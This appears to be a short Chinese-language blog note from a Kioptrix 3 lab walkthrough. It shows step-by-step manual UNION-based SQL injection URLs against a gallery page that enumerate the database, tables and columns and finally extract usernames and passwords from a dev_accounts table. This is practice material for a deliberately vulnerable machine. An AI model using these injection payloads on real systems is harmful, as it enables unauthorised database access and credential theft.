然后我跟着他思路来发现了一个环境配置的问题，就是如果你是同一网段发现的ip，你很难找域名，找着了也要把域名加到host里面。如果是同一ip域名真的很麻烦。

每次到了手动sql注入的环节我都要气爆，以后还是交给sqlmap吧

http://kioptrix3.com/gallery/gallery.php?id=1 union all select 1,database(),3,4,5,6 –&sort=size#photos

先order by 查行数，然后union all select查哪些行可用，然后查数据库

http://kioptrix3.com/gallery/gallery.php?id=1 union all select 1,table_name,3,4,5,6 from information_schema.tables where table_schema =database() –&sort=photoid#photos

table_name，information_schema.tables是一个information_schema的一个方法

http://kioptrix3.com/gallery/gallery.php?id=1 union all select 1,table_name,3,4,5,6 from information_schema.tables where table_schema = char(100,101,118,95,97,99,99,111,117,110,116,115) –&sort=photoid#photos

一般来说，这个传给这个方法的字符是不认的，必须通过myqsl自带的char函数进行转义

http://kioptrix3.com/gallery/gallery.php?id=1 union all select 1,column_name,3,4,5,6 from information_schema.columns where table_name = char(100,101,118,95,97,99,99,111,117,110,116,115)–&sort=photoid#photos

查完表查属性

http://kioptrix3.com/gallery/gallery.php?id=1 union all select 1,username,password,4,5,6 from dev_accounts –&sort=photoid#photos

知道表，属性，直接查内容
